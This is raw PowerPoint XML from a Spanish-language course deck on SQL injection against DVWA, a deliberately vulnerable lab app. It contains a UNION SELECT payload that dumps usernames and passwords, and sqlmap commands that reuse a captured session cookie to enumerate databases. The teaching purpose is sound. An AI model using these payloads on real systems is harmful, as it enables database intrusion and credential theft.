            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – Nivel elevado</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="CuadroTexto 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{250017BC-1DCD-DEFB-7FE2-8F27CD1E8946}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="454844" y="946550"/>
            <a:ext cx="6094428" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1 'UNION SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>user,password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> FROM users#</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6" descr="Interfaz de usuario gráfica, Texto, Aplicación&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F831AFF1-B504-D380-7270-DAC0975D36B3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3035935" y="1573847"/>
            <a:ext cx="6593682" cy="3997394"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3025944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435092" y="229220"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Práctica</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1654793" y="1404378"/>
            <a:ext cx="9343950" cy="4248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a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Realizar el ataque al nivel medio</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3208410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4056" y="66110"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – Nivel elevado</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="CuadroTexto 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{250017BC-1DCD-DEFB-7FE2-8F27CD1E8946}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="454844" y="946550"/>
            <a:ext cx="6094428" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1 'UNION SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>user,password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> FROM users#</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6" descr="Interfaz de usuario gráfica, Texto, Aplicación&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F831AFF1-B504-D380-7270-DAC0975D36B3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3035935" y="1573847"/>
            <a:ext cx="6593682" cy="3997394"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="680786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4056" y="66110"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4BAF07C3-BC86-3C55-526E-C2D002A8B05F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344055" y="848747"/>
            <a:ext cx="10666451" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>El siguiente ataque consiste en usar las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coockies</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de sesión de una conexión lícita para usarlas en la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>automatización de extracción de información de la base de datos de forma automatizada usando el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Primero buscamos la cookie de la sesión lícita establecida desde Chrome, pres F12 en la sección Aplicación</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Imagen 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DBAA9B3D-7A0B-9A55-9483-7D12F9EFFEBD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2695100" y="1904787"/>
            <a:ext cx="6801799" cy="3048425"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="CuadroTexto 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{98AB5C46-FF3B-1F87-4550-43D1A2191660}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2514153" y="5216892"/>
            <a:ext cx="6094428" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>c1o8mfmbnfdit63ig1p3kpfum0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4633626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4056" y="66110"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{900B3F8F-BFBD-827B-14EF-A0407E7019B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-5162" y="848747"/>
            <a:ext cx="11449301" cy="2850139"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>c1o8mfmbnfdit63ig1p3kpfum0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="450215" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>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-u es la URL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="450215" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>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-cookie es la cookie utilizada para la sesión</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>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Recibirás algunas preguntas (pongo la predeterminada)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pP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5" name="Imagen 4" descr="Texto&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{41EE1458-A51C-E01A-2088-71EF69B09FF8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="454817" y="3320190"/>
            <a:ext cx="5400040" cy="2654935"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6" descr="Texto&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F739B050-39E2-9596-1C96-8FA7A8322ABF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6044099" y="3466239"/>
            <a:ext cx="5400040" cy="2362835"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3650105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4056" y="66110"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F3042DD9-DADD-B2FA-B4F9-ABF48123D73F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="247454" y="848747"/>
            <a:ext cx="11385221" cy="1372812"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>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Agregando un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dbs</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puede obtener información del nombre de la base de datos</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> -u "http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>192.168.99.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dvwa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/vulnerabilities/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sqli</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/?id=1&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00FF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
